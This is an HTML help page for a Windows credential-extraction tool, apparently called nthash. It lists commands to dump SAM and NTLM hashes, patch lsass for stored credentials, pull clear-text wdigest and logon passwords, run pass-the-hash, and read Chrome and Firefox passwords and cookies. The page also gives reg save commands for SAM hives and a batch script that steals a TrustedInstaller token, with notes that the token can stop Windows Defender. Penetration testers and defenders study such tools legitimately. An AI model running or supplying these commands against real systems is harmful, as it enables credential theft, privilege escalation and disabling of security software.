<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
	<META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=windows-1252">
	<TITLE></TITLE>
	<META NAME="GENERATOR" CONTENT="OpenOffice 4.1.1  (Win32)">
	<META NAME="CREATED" CONTENT="0;0">
	<META NAME="CHANGEDBY" CONTENT="Erwan L">
	<META NAME="CHANGED" CONTENT="20200101;15380385">
	<META NAME="CHANGEDBY" CONTENT="Erwan L">
	<META NAME="CHANGEDBY" CONTENT="Erwan L">
	<META NAME="CHANGEDBY" CONTENT="Erwan L">
	<STYLE TYPE="text/css">
	<!--
		PRE.cjk { font-family: "NSimSun", monospace }
	-->
	</STYLE>
</HEAD>
<BODY LANG="fr-FR" DIR="LTR">
<PRE CLASS="western"><FONT COLOR="#000000"><SPAN STYLE="font-style: normal"><SPAN STYLE="font-weight: normal"><A HREF="#setntlm">setntlm</A> </SPAN></SPAN></FONT>
<FONT COLOR="#000000"><SPAN STYLE="font-style: normal"><SPAN STYLE="font-weight: normal"><A HREF="#changentlm">changentlm</A> </SPAN></SPAN></FONT>
<FONT COLOR="#000000">getntlmhash /password:password</FONT>
<FONT COLOR="#000000">getsid /user:username [/server:hostname]</FONT>
<FONT COLOR="#000000">getusers [/server:hostname]</FONT>
<FONT COLOR="#000000">getdomains [/server:hostname</FONT>
<A HREF="#dumpsam"><FONT COLOR="#000000"><SPAN STYLE="font-style: normal"><SPAN STYLE="font-weight: normal">dumpsam</SPAN></SPAN></FONT></A>
<FONT COLOR="#000000"><SPAN STYLE="font-style: normal"><SPAN STYLE="font-weight: normal"><A HREF="#dumphashes">dumphashes</A> </SPAN></SPAN></FONT>
<FONT COLOR="#000000"><A HREF="#getsamkey">getsamkey</A> </FONT>
<FONT COLOR="#000000"><A HREF="#getsyskey">getsyskey</A> </FONT>
<FONT COLOR="#000000">getlsakeys</FONT>
<A HREF="#wdigest"><FONT COLOR="#000000">wdigest</FONT></A>
<A HREF="#logonpasswords"><FONT COLOR="#000000">logonpasswords</FONT></A>
<FONT COLOR="#000000">pth /user:username /password:myhash /domain:mydomain</FONT>
<A HREF="#enumcred"><FONT COLOR="#000000">enumcred</FONT></A>
<A HREF="#enumcred2"><FONT COLOR="#000000">enumcred2</FONT></A>
<A HREF="#enumvault"><FONT COLOR="#000000">enumvault</FONT></A>
<FONT COLOR="#000000">chrome [/binary:path_to_database]</FONT>
<FONT COLOR="#000000">ccookies [/binary:path_to_database]</FONT>
<FONT COLOR="#000000">firefox [/binary:path_to_database]</FONT>
<FONT COLOR="#000000">fcookies [/binary:path_to_database]</FONT>
<FONT COLOR="#000000">bytetostring /input:hexabytes</FONT>
<FONT COLOR="#000000">stringtobyte /input:string</FONT>
<FONT COLOR="#000000">filetobyte /binary:filename</FONT>
<FONT COLOR="#000000">bytetofile /input:hexabytes</FONT>
<FONT COLOR="#000000">widestringtobyte /input:string</FONT>
<FONT COLOR="#000000">base64encodew /input:string</FONT>
<FONT COLOR="#000000">base64encode /input:string</FONT>
<FONT COLOR="#000000">base64decode /input:base64string</FONT>
<FONT COLOR="#000000">getlsasecret /input:secret</FONT>
<FONT COLOR="#000000">dpapimk</FONT>
<FONT COLOR="#000000"><SPAN STYLE="font-style: normal"><SPAN STYLE="font-weight: normal"><A HREF="#cryptunprotectdata">cryptunprotectdata</A> </SPAN></SPAN></FONT>
<FONT COLOR="#000000"><SPAN STYLE="font-style: normal"><SPAN STYLE="font-weight: normal"><A HREF="#cryptprotectdata">cryptprotectdata</A> </SPAN></SPAN></FONT>
<FONT COLOR="#000000">decodeblob /binary:filename [/input:hexabytes]</FONT>
<FONT COLOR="#000000">decodemk /binary:filename [/input:hexabytes]</FONT>
<FONT COLOR="#000000">gethash /mode:hashid /input:hexabytes</FONT>
<FONT COLOR="#000000">gethmac /mode:hashid /input:hexabytes /key:hexabytes</FONT>
<FONT COLOR="#000000">getcipher /mode:cipherid /input:hexabytes /key:hexabytes</FONT>
<FONT COLOR="#000000">getlsasecret /input:secret</FONT>
<FONT COLOR="#000000">dpapi_system</FONT>
<FONT COLOR="#000000">runasuser /user:username /password:password [/binary: x:\folder\bin.exe]</FONT>
<FONT COLOR="#000000"><A HREF="#runastoken">runastoken</A> </FONT>
<FONT COLOR="#000000"><A HREF="#runaschild">runaschild</A> </FONT>
<FONT COLOR="#000000"><A HREF="#runas">runas</A> </FONT>
<FONT COLOR="#000000"><A HREF="#runts">runts</A> </FONT>
<FONT COLOR="#000000">enumpriv</FONT>
<FONT COLOR="#000000">enumproc</FONT>
<FONT COLOR="#000000">dumpproc /pid:12345</FONT>
<FONT COLOR="#000000">runwmi /binary: x:\folder\bin.exe [/server:hostname]</FONT>
<FONT COLOR="#000000">context</FONT>
<FONT COLOR="#000000">a_command /verbose</FONT>
<FONT COLOR="#000000">a_command /system</FONT>

<A NAME="changentlm"></A>
<FONT COLOR="#000000">changentlm, using a legacy api, may not work if your ntlm hashes are encrypted with AES (i.e starting with win10 1607.</FONT>
<FONT COLOR="#000000">Credits goes to https://github.com/vletoux/NTLMInjector</FONT>
<A NAME="setntlm"></A>
<FONT COLOR="#000000">setntlm on the other hand should always work and allow one to bypass password policy.</FONT>
<FONT COLOR="#000000">Credits goes to https://github.com/vletoux/NTLMInjector</FONT>
<A NAME="dumpsam"></A>
<FONT COLOR="#000000">dumpsam will temporarily patch a module in lsass to be able to dump your SAM ntlm hashes from the lsass memory (need to cover/test as many windows version as possible).</FONT>

<A NAME="dumphash"></A><A NAME="dumphashes"></A><FONT COLOR="#000000">dumphash and dumphashes will read the registry - you need to run as system to perform this action</FONT>
<FONT COLOR="#000000">. Or you can use the /system switch</FONT>
<FONT COLOR="#000000">. You can also perform this offline (and then no longer require to run as system).</FONT>
<FONT COLOR="#000000">You can use reg save hklm\sam sam.sav and reg save hklm\system system.sav to generate offline hives.</FONT>
<FONT COLOR="#000000">Both the RC4 and AES cipher are supported.</FONT>
<FONT COLOR="#000000">https://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/ is a must read to understand RC4 vs AES.</FONT>

<A NAME="getsamkey"></A><FONT COLOR="#000000">getsamkey (also known as hashed bootkey) will read/decrypt SAM\sam\Domains\account\F.</FONT>
<FONT COLOR="#000000">Both AES and RC4 encryptions are supported.</FONT>

<A NAME="getsyskey"></A><FONT COLOR="#000000">getsyskey (also known as bootkey) will read/decode class attribute from SYSTEM\CurrentControlSet\Control\Lsa.</FONT>

<A NAME="cryptunprotectdata"></A><A NAME="cryptprotectdata"></A><FONT COLOR="#000000">cryptunprotectdata and cryptprotectdata will decrypt datas using dpapi under the runnin user context.</FONT>
<FONT COLOR="#000000">You can for example decrypt the wireless stored password in C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces{INTERFACE UUID} .</FONT>
<FONT COLOR="#000000">Retrieve the xml keyMaterial value and run nthash /cryptunprotectdata /input:keymateriel /system .</FONT>
<FONT COLOR="#000000">Note that this data is encrypted/decrypted under the system account.</FONT>

<A NAME="enumcred"></A><FONT COLOR="#000000">enumcred will use CredEnumerate windows API to enumerate the logged on user credentials.</FONT>
<A NAME="enumcred2"></A><FONT COLOR="#000000">enumcred2 will use CredEnumerate windows API to enumerate the logged on user credentials while also patching lsass to dump all credentials</FONT>

<A NAME="enumvault"></A><FONT COLOR="#000000">enumvault will use vaultcli.dll windows API to enumerate the logged on user vault credentials.</FONT>

<A NAME="logonpasswords"></A><FONT COLOR="#000000">logonpasswords will dump lsasrv logon sessions primary credentials (hashes) and credential managers (clear text)</FONT>

<A NAME="wdigest"></A><FONT COLOR="#000000">wdigest will dump wdigest sessions credentials (clear text)</FONT>

<A NAME="runastoken"></A><FONT COLOR="#000000">runastoken can be used to run a process under a system account.</FONT>
<FONT COLOR="#000000">Once under a system account, you can also &quot;steal&quot; a token from trustedinstaller (net start trustedinstaller before hand.</FONT>
<FONT COLOR="#000000">Note that you can steal a trustedinstaller token directly by using the /system switch.</FONT>
<FONT COLOR="#000000">With a trustedinstaller token, you can perform actions like stop windefend (or kill the process, or modify the AV settings, etc).</FONT>
<FONT COLOR="#000000">See example below where you would start the trustedinstaller service, retrieve its pid and run a process as the account.</FONT>
<FONT COLOR="#000000">@echo off</FONT>
<FONT COLOR="#000000">net start trustedinstaller</FONT>
<FONT COLOR="#000000">for /F &quot;tokens=1&quot; %%K in (' nthash-win64 /enumproc ^| findstr /i &quot;trustedinstaller&quot; ') do ( nthash-win64 /runastoken /pid:%%K /system )</FONT>

<A NAME="runaschild"></A><FONT COLOR="#000000">runaschild can be used to run a process as a child of another existing/parent process.</FONT>
<FONT COLOR="#000000">Note that some apps (like cmd.exe) will crash right after initialization with a c0000142.</FONT>
<FONT COLOR="#000000">Wierdly enough, loading notepad.exe with this method and then launching cmd.exe from there works...</FONT>

<A NAME="runas"></A><FONT COLOR="#000000">runas will launch a process in elevated mode.</FONT>

<A NAME="runts"></A><FONT COLOR="#000000">runts will launch a process in the context of another TS session.</FONT>
<FONT COLOR="#000000">Note that this one needs the setcbprivilege so you will have to find a token with such privilege first (like winlogon.exe).</FONT></PRE><P>
<BR><BR>
</P>
</BODY>
</HTML>